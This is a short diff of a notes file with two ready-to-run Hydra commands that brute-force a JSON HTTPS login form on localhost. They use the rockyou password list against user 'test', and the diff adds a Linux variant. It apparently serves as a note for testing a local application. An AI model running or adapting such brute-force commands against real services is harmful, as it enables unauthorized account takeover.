@@ -1,2 +1,4 @@
 ﻿HYDRA:
 hydra -v -V -l test -P rockyou.txt -s 7268 -S localhost https-post-form "/Login:{\"Username\"\:\"test\",\"Password\"\:\"^PASS^\"}:S=token:H=Accept: application/json:H=Content-Type: application/json:H=Accept-Encoding: gzip, deflate"
+
+Linux: hydra -v -V -S -f -l test -P /usr/share/wordlists/rockyou.txt -s 7268 localhost https-post-form "/Login:{\"Username\"\:\"test\",\"Password\"\:\"^PASS^\"}:H=Accept: application/json:H=Content-Type: application/json:H=Accept-Encoding: gzip, deflate:S=token"
